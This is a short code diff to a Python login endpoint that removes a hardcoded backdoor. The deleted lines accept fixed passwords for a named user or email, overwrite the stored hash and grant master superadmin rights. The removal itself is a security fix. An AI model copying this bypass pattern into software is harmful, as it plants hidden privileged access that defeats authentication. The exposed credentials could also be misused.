@@ -291,14 +291,6 @@ def login(payload: LoginRequest, db: Session = Depends(get_db)):
             if db_user.password_hash:
                 is_valid = verify_password(payload.password, db_user.password_hash)
 
-            if not is_valid and clean_user in {"seba", "sebar_2@hotmail.com"}:
-                if payload.password in {"bato1420", "admin123"}:
-                    is_valid = True
-                    db_user.password_hash = hash_password(payload.password)
-                    db_user.role = ROLE_CONTROLLER_ADMIN
-                    db_user.is_master_superadmin = True
-                    master_db.commit()
-
             if not is_valid:
                 raise HTTPException(
                     status_code=status.HTTP_401_UNAUTHORIZED,
